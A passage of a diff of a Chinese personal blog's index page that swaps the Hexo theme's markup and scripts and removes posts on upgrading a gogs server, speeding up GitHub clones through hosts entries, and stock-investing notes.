@@ -1,1124 +1,222 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"usmacd.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-
-    <meta property="og:type" content="website">
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>安全代码</title><meta name="author" content="henices"><meta name="copyright" content="henices"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
 <meta property="og:title" content="安全代码">
 <meta property="og:url" content="http://usmacd.com/page/4/index.html">
 <meta property="og:site_name" content="安全代码">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://usmacd.com/img/avatar.png">
 <meta property="article:author" content="henices">
 <meta name="twitter:card" content="summary">
-
-
-<link rel="canonical" href="http://usmacd.com/page/4/">
-
-
-
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/4/index.html","title":""}</script>
-
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>安全代码</title>
-  
-
-
-
-
-
-
-
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-<link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
-
-  <main class="main">
-    <div class="column">
-      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <h1 class="site-title">安全代码</h1>
-      <i class="logo-line"></i>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger" aria-label="Search" role="button">
-    </div>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li>
-  </ul>
-</nav>
-
-
-
-
-</header>
-        
-  
-  <aside class="sidebar">
-
-    <div class="sidebar-inner sidebar-overview-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="henices"
-      src="/images/avatar.jpg">
-  <p class="site-author-name" itemprop="name">henices</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">102</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">15</span>
-        <span class="site-state-item-name">tags</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author animated">
-      <span class="links-of-author-item">
-        <a href="https://twitter.com/henices" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;henices" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="/atom.xml" title="RSS → &#x2F;atom.xml" rel="noopener me"><i class="rss fa-fw"></i>RSS</a>
-      </span>
-  </div>
-
-        </div>
-      </div>
-    </div>
-
-    
-    <div class="sidebar-inner sidebar-blogroll">
-      <div class="links-of-blogroll animated">
-        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
-          Links
-        </div>
-        <ul class="links-of-blogroll-list">
-            <li class="links-of-blogroll-item">
-              <a href="http://scz.617.cn:8/" title="http:&#x2F;&#x2F;scz.617.cn:8&#x2F;" rel="noopener" target="_blank">飞花堂</a>
-            </li>
-            <li class="links-of-blogroll-item">
-              <a href="https://www.v2ex.com/" title="https:&#x2F;&#x2F;www.v2ex.com&#x2F;" rel="noopener" target="_blank">V2EX</a>
-            </li>
-            <li class="links-of-blogroll-item">
-              <a href="https://blog.forecho.com/" title="https:&#x2F;&#x2F;blog.forecho.com&#x2F;" rel="noopener" target="_blank">forecho</a>
-            </li>
-            <li class="links-of-blogroll-item">
-              <a href="https://www.mrhuangtalk.com/" title="https:&#x2F;&#x2F;www.mrhuangtalk.com&#x2F;" rel="noopener" target="_blank">Mr.Huang talk</a>
-            </li>
-            <li class="links-of-blogroll-item">
-              <a href="https://demochen.com/" title="https:&#x2F;&#x2F;demochen.com&#x2F;" rel="noopener" target="_blank">DemoChen</a>
-            </li>
-        </ul>
-      </div>
-    </div>
-  </aside>
-
-
-    </div>
-
-    <div class="main-inner index posts-expand">
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/gogs/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/gogs/" class="post-title-link" itemprop="url">gogs 皮肤和源码升级</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>gogs 使用了也有一年多了，小团队使用基本还行。有几个问题，第一界面代码 merge 有问题，第二不支持代码 review，<br>如果能解决上面两个问题就好用很多了。下面两段是年前折腾 gogs 的记录，没有啥技术含量，只是做个备份。</p>
-<h2 id="切换皮肤"><a href="#切换皮肤" class="headerlink" title="切换皮肤"></a>切换皮肤</h2><p><a target="_blank" rel="noopener" href="https://github.com/Kos-M/GogsThemes">https://github.com/Kos-M/GogsThemes</a> 提供了两款皮肤，文中给出的方法要修改 gogs 配置，直接使用 TamperMonkey 就可以了。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         Gogs Theme</span></span><br><span class="line"><span class="comment">// @resource     IMPORTED_CSS https://raw.githubusercontent.com/Kos-M/GogsThemes/master/themes/dark_theme.css</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  try to take over the world!</span></span><br><span class="line"><span class="comment">// @author       You</span></span><br><span class="line"><span class="comment">// @match        http://website:8000/*</span></span><br><span class="line"><span class="comment">// @grant        GM_getResourceText</span></span><br><span class="line"><span class="comment">// @grant        GM_addStyle</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> my_css = <span class="title function_">GM_getResourceText</span>(<span class="string">&quot;IMPORTED_CSS&quot;</span>);</span><br><span class="line">    <span class="title function_">GM_addStyle</span>(my_css);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-
-<p>使用后效果图</p>
-<p><img src="https://github.com/henices/pictures/raw/master/gogs0.png"></p>
-<h2 id="源码升级"><a href="#源码升级" class="headerlink" title="源码升级"></a>源码升级</h2><p>gogs 已经有一年多没有提供二进制的安装包了，看了改进不少，就尝试了源码升级。<br>参考 <a target="_blank" rel="noopener" href="https://gogs.io/docs/installation/install_from_source#%E6%B5%8B%E8%AF%95%E5%AE%89%E8%A3%85">https://gogs.io/docs/installation/install_from_source#%E6%B5%8B%E8%AF%95%E5%AE%89%E8%A3%85</a></p>
-<h3 id="安装-golang"><a href="#安装-golang" class="headerlink" title="安装 golang"></a>安装 golang</h3><p>参考 Google 官方文档，执行下面命令就可以了。 <a target="_blank" rel="noopener" href="https://go.dev/doc/install">https://go.dev/doc/install</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://go.dev/dl/go1.17.6.linux-amd64.tar.gz</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.17.6.linux-amd64.tar.gz</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/local/go/bin</span><br></pre></td></tr></table></figure>
-<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆仓库到 &quot;gogs&quot; 子目录</span></span><br><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/gogs/gogs.git gogs</span><br><span class="line"><span class="comment"># 修改工作目录</span></span><br><span class="line"><span class="built_in">cd</span> gogs</span><br><span class="line"><span class="comment"># 编译主程序，这个步骤会下载所有依赖</span></span><br><span class="line">go build -o gogs</span><br></pre></td></tr></table></figure>
-
-<p>编译过程会下载文件（需要自备梯子），编译完成后将在 gogs 工作目下生成 gogs 可执行文件</p>
-<h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><p>gogs 源码的 Makefile 提供了打包命令，执行 <code>make pack</code> 即可，将在 release 目生成 <code>gogs.20220112095054.zip</code></p>
-<h3 id="迁移配置"><a href="#迁移配置" class="headerlink" title="迁移配置"></a>迁移配置</h3><p>将 gogs.20220112095054.zip 解压，这就类似 gogs 的二进制升级了 <a target="_blank" rel="noopener" href="https://gogs.io/docs/upgrade/upgrade_from_binary">https://gogs.io/docs/upgrade/upgrade_from_binary</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> gogs gogs_old</span><br><span class="line"><span class="built_in">cp</span> -R gogs_old/custom gogs</span><br><span class="line"><span class="built_in">cp</span> -R gogs_old/data gogs</span><br><span class="line"><span class="built_in">cp</span> -R gogs_old/log gogs</span><br></pre></td></tr></table></figure>
-
-<p>gogs 0.13 的配置已经发生了变化，如果不修改配置执行 <code>./gogs web</code>会出现错误</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2022/01/12 09:40:06 [ INFO] Gogs 0.13.0+dev</span><br><span class="line">2022/01/12 09:40:06 [FATAL] [...github/internal/route/install.go:75 GlobalInit()] Failed to initialize ORM engine:</span><br><span class="line">open database: failed to connect to `host=127.0.0.1 user=root database=gogs`: dial error (dial tcp 127.0.0.1:3306: connect: connection refused)</span><br></pre></td></tr></table></figure>
-
-<p>看错误像是在连接 mysql 的 3306 端口，可是配置文件设置的是使用 sqlite，非常困惑。上网搜索后证实是 gogs 0.13 的配置文件的字段修改了。</p>
-<p><img src="https://github.com/henices/pictures/raw/master/gogs1.png"></p>
-<p>最关键的两个字段是数据库相关的 <code>DB_TYPE</code> 改为 <code>TYPE</code>， <code>PASSWD</code> 改为 <code>PASSWORD</code> 修改后 <code>custom/conf/app.ini</code> 后，执行 <code>./gogs web</code> 一切正常。</p>
-
+<meta name="twitter:image" content="http://usmacd.com/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://usmacd.com/page/4/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '安全代码',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-11-06 14:11:14'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
       
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
+        get: key => {
+          const itemStr = localStorage.getItem(key)
       
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/github_speed_up/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/github_speed_up/" class="post-title-link" itemprop="url">github clone 加速</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>国内因为众所周知的原因，git clone 一直很慢，最近可能状况就更糟糕了。@TeleMan 提供了一个信息，可以<br>通过修改 host 文件达到加速效果。经过测试，只要修改两条记录即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">199.232.69.194                github.global.ssl.fastly.net</span><br><span class="line">140.82.113.4                  github.com</span><br></pre></td></tr></table></figure>
-
-<p>修改后，速度快多了，直连</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/googleprojectzero/winafl.git</span><br><span class="line">正克隆到 &#x27;winafl&#x27;...</span><br><span class="line">remote: Enumerating objects: 1538, done.</span><br><span class="line">remote: Counting objects: 100% (175/175), done.</span><br><span class="line">remote: Compressing objects: 100% (108/108), done.</span><br><span class="line">remote: Total 1538 (delta 90), reused 130 (delta 60), pack-reused 1363</span><br><span class="line">接收对象中: 100% (1538/1538), 5.29 MiB | 765.00 KiB/s, 完成.</span><br><span class="line">处理 delta 中: 100% (846/846), 完成.</span><br></pre></td></tr></table></figure>
-
-<p>使用一段时间后发现不是太稳定，终极大法还是需要一个长长的梯子，此方法记为备用方案。</p>
-
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
       
-    </div>
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
 
-    
-    
-    
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
 
-    <footer class="post-footer">
-        <div class="post-eof"></div>
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
       
-    </footer>
-  </article>
-</div>
-
-
-
-
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/fupangjiqiao/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/fupangjiqiao/" class="post-title-link" itemprop="url">高效复盘技巧</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>前些年总结的，现在看起来，过于复杂了，可能做短线的会有需求。</p>
-<p><img src="https://github.com/henices/pictures/raw/master/webwxgetmsgimg.jpeg" alt="image"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/fundamental/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/fundamental/" class="post-title-link" itemprop="url">基本面需要关注的点</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>准备多写点东西，内容将不在局限于网络安全。</p>
-<p>不得不说搞金融的这些人很厉害，各种玩法坑死大家了。<br>除了一般需要关注的点，还需要关注几个地方，其实这些点在某些情况下比PE，ROE 啥的都重要：</p>
-<ul>
-<li>可转债 （一堆家伙喜欢套利）</li>
-<li>配股   （散户不太喜欢配股）</li>
-<li>融资盘 （主力不喜欢太多人做轿子）</li>
-<li>增发   （这个情况比较复杂，增发价是比较重要的）</li>
-<li>质押   （太高可能暴雷）</li>
-<li>GDR   （还是套利）</li>
-<li>商誉   （可能要计提，影响净利润）</li>
-<li>减持   （主力不喜欢给大股东抬轿子)</li>
-</ul>
-<p>要了解这些情况最可靠的方法为读公告，一般情况雪球和东方财富股吧会有人讨论。</p>
-<p><a target="_blank" rel="noopener" href="https://xueqiu.com/">https://xueqiu.com/</a><br><a target="_blank" rel="noopener" href="http://guba.eastmoney.com/">http://guba.eastmoney.com/</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/fengliu/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/fengliu/" class="post-title-link" itemprop="url">【转】冯柳投资十大金句</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>（一）经济的波动就像是剪羊毛，长好了就剪、剪完了再长。拿剪子的一般就是赢家，当然赢家之间也有互相剪的，所以就有大小赢家、长短赢家之分。</p>
-<p>（二）技术分析主要是找出趋势和预期同向运动并强化的机会，价值分析则可以在反向运动但最终会被预期改变的机会上下注。</p>
-<p>（三）各方面都完美的系统是不可能长期存在的，放弃效率和短期安全的系统往往才会是长期安全和可重复的。这不太符合人性，也就保证了系统的独特和有效性，也有利于将精力放在长期要素和战略点的思考上。</p>
-<p>（四）涨跌都能令人坚定的才是好标的，跌令实的更实，因为价钱便宜了。涨令虚处显得确定，因为得到市场的确认和佐证了。这就是虚实结合带来的效果，如果涨几十个点就让人有想卖的感觉，那就说明虚处不足，就不太可能是好选择，最后也许连那几十个点也不容易挣到。反过来也是一样，跌了不敢重仓加的就说明实处不够，要多检讨下自己对确定性的把握能力。</p>
-<p>（五）资产就是金钱在不同时间下的不同属性，本质就是现在的钱和未来的钱之间进行交换，买入是用现在换未来，卖出则是把未来换现在，关键要想明白未来和现在谁更值钱就好了。牛熊市就是这样的一个判断依据，当然，对极少数的优异公司来说，未来总是会强过现在的，这就是比牛熊大势更大的大势。</p>
-<p>（六）市场在不断变化，企业也在不断变化，变化是常态，所以任何时候都要多方向的反复审视，对世界有敬畏心。这个敬畏就是要认识到事物总是在不断变化和出现意外的，所以要尽量让自己处于有保护的状态，尽量多的假设极端情况下的可靠性。</p>
-<p>（七）当全世界都想通过股市来对抗通货膨胀的时候，也许拿着现金让其自然贬值会是更好的选择。除非你能找到明确的新增预期，否则凭什么指望别人以更高的价钱来购买已经给他人提供过保值机会的资产呢（房地产）。</p>
